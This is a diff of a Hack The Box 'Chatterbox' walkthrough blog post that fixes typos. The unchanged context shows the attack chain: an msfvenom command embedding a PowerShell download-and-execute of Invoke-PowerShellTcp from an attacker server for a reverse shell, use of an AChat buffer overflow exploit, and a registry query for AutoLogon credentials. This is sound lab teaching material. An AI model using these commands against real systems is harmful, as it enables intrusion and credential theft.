@@ -7,9 +7,9 @@ title: "HTB: Chatterbox Walkthrough"
 
 # intro
 
-The goal of this post to provide an updated version of Hack The Boxes machine, [Chatterbox](https://app.hackthebox.com/machines/123) (I am not sure if any one else has made a similar post but more than one doesn't hurt). 
+The goal of this post is to provide an updated version of Hack The Box's machine, [Chatterbox](https://app.hackthebox.com/machines/123) (I am not sure if any one else has made a similar post but more than one doesn't hurt). 
 
-There where a few trouble areas when doing this machine so my goal is to help anyone who may have ran into similar issues themsleves. I followed [0xdf's](https://0xdf.gitlab.io/2018/06/18/htb-chatterbox.html) walkthrough and there seems to be seem dated steps that could be updated. I intend to correct these dated issues with this post.
+There where a few trouble areas when doing this machine so my goal is to help anyone who may have ran into similar issues themsleves. I followed [0xdf's](https://0xdf.gitlab.io/2018/06/18/htb-chatterbox.html) walkthrough and there seems to be some dated steps that could be updated. I intend to correct these dated issues with this post.
 
 Let's dive in! 
 
@@ -44,7 +44,7 @@ The **nmap** scan shows that there are two _non-default_ ports outside of the de
 
 ### AChat on port 9256
 
-There is a service called **AChat** running on port `9255` and `9256`. There is a known [buffer overflow](https://www.exploit-db.com/exploits/36025) that affects the version on AChat running on our attack machine. The exploits is sent to port `9256 / UDP`. 
+There is a service called **AChat** running on port `9255` and `9256`. There is a known [buffer overflow](https://www.exploit-db.com/exploits/36025) that affects the version of AChat running on the target machine. This exploit is sent to port `9256 / UDP`. 
 
 ## initial exploit 
 
@@ -52,7 +52,7 @@ Because this is a windows host, we can use [Nishang's](https://github.com/samrat
 
 We will create a payload with **msfvenom** and deliver it via the Exploit-DB Python script to exploit the AChat vulnerability. Successful exploitation will run **Invoke-PowerShellTcp.ps1** and attempt to establish a reverse shell.
 
-This is the **msfvenom** command to generate the shell code that we will use in the Python script (do not forget to add your Attacker IP / port):
+This is the **msfvenom** command to generate the shell code that we will use in the Python script (do not forget to add your Attacker IP / Port):
 
 ```bash
 t3lesph0re@neptune:~$ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell iex(new-object net.webclient).downloadstring('http://10.10.14.8/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 8082" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode
@@ -139,7 +139,7 @@ while i<len(p):
 sock.close()
 ```
 
-Once you have updated this script, we will need 3 seperate terminals: python HTTP server, listener, and the exploit script. 
+Once you have updated this script, we will need 3 seperate terminals: Python HTTP server, listener, and the exploit script. 
 
 1. Start the HTTP python server:
 
@@ -161,7 +161,7 @@ Because the script shebang shows **#!/usr/bin/python**, we will use **Python2**:
 t3lesph0re@neptune:~$ python2 36025
 ```
 
-The Python script will run and you will see that the **Invoke-PowerShellTcp.ps1** was grab from the Python HTTP server (`10.10.10.74 - - [14/Oct/2025 19:09:22] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -`). Additionally, the script will output its `---->{P00F}!` and you will get your reverse shell for the user **chatterbox\alfred**. 
+The Python script will run and you will see that the **Invoke-PowerShellTcp.ps1** was grabbed from the Python HTTP server (`10.10.10.74 - - [14/Oct/2025 19:09:22] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -`). Additionally, the script will output its `---->{P00F}!` and you will get your reverse shell for the user **chatterbox\alfred**. 
 
 <figure>
   <img src="{{ '/assets/images/chatterbox-revshell.png' | relative_url }}" alt="Chatterbox Reverse Shell" />
@@ -170,7 +170,7 @@ The Python script will run and you will see that the **Invoke-PowerShellTcp.ps1*
 
 ## privilege escalation to admin
 
-From here we can use our low level user shell to enumerate the AutoLogon credentials:
+From here we can use our low level user shell to enumerate the _AutoLogon_ credentials:
 
 ```powershell
 PS C:\> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
